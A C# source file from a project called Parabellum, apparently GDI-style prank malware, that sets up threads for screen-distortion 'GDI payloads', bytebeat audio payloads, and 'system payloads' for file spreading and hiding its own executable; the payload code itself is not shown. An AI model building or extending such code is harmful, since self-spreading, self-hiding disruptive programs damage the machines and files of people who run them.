using static Vanara.PInvoke.User32;
using static Parabellum.PayloadGdi;
using static Parabellum.Bytebeat;
using System.Threading;
using System.Windows.Forms;

namespace Parabellum
{
    public class Threading
    {
        //  PAYLOADS GDI
        public static Thread tLoad1 = new Thread(Load1);
        public static Thread tLoad2 = new Thread(Load2);
        public static Thread tLoad3 = new Thread(Load3);
        public static Thread tLoad4 = new Thread(Load4);
        public static Thread tLoad5 = new Thread(Load5);
        public static Thread tLoad6 = new Thread(Load6);
        public static Thread tLoad7 = new Thread(Load7);
        public static Thread tLoad8 = new Thread(Load8);
        public static Thread tLoad9 = new Thread(Load9);
        public static Thread tLoad10 = new Thread(Load10);



        // BYTEBEAT
        public static Thread tBeat1 = new Thread(Beat1);
        public static Thread tBeat2 = new Thread(Beat2);
        public static Thread tBeat3 = new Thread(Beat3);
        public static Thread tBeat4 = new Thread(Beat4);
        public static Thread tBeat5 = new Thread(Beat5);
        public static Thread tBeat6 = new Thread(Beat6);
        public static Thread tBeat7 = new Thread(Beat7);
        public static Thread tBeat8 = new Thread(Beat8);
        public static Thread tBeat9 = new Thread(Beat9);
        public static Thread tBeat10 = new Thread(Beat10);



        //   PAYLOADS GDI SUPORT
        public static Thread tRgb = new Thread(SuportGdi.RgbDraw);
        public static Thread tIconsMove = new Thread(() => SuportGdi.DrawIconsMove(IDI_INFORMATION, 14, 0, true));
        public static Thread tBlur = new Thread(SuportGdi.BlurEffect);
        public static Thread tScribble = new Thread(SuportGdi.Scribble);




        //   PAYLOADS SYSTEM
        public static Thread tFileSpread = new Thread(PayloadSystem.FileSpreading);
        public static Thread tHideFileExecutable = new Thread(() => PayloadSystem.HideFile(Application.ExecutablePath));
    }
}
